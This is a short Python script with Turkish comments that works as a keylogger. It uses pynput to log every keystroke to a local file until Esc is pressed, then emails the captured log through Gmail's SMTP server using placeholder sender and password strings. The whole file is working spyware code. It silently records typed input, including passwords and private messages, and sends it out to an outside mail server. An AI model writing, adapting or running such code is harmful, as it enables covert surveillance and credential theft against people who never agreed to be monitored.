from pynput.keyboard import Key,Listener #basılan tuşu dinleme,algılama
import logging #log tutma(error,debug)
import smtplib

# Import the email modules we'll need
from email.mime.text import MIMEText

recording_path = ""

logging.basicConfig(filename = (recording_path + "log.txt"),level = logging.DEBUG,format = '%(asctime)s : %(message)s')#logları tutacağımız dosyaları ve ayarlarını oluşturuyor

def press_key(key):
    logging.info("Pressed Key [{}]".format(str(key)))

def on_release(key):#esctuşunabasıldığındaprogramdursun
    if key == Key.esc:
        print("Dosyaya Kaydedildi")
        return False

with Listener(on_press = press_key, on_release= on_release) as listener:#on_press tuşları algılayan fonksiyon ve içine press_keyi gönderiyoruz çünkü algıladğımız kısım press_key fonksiyonu.
    listener.join()
    


with open('log.txt') as fp:
    # Create a text/plain message
    msg = MIMEText(fp.read())

# me == the sender's email address
# you == the recipient's email address
msg['Subject'] = 'Log Records -> {}'.format("log.txt")
msg['From'] = "senderemail"
msg['To'] = "senderemail"

# Send the message via our own SMTP server.
s = smtplib.SMTP("smtp.gmail.com",587)
s.ehlo()
s.starttls()    
s.login("yourmail","yourmailPassword")
s.send_message(msg)
s.quit()
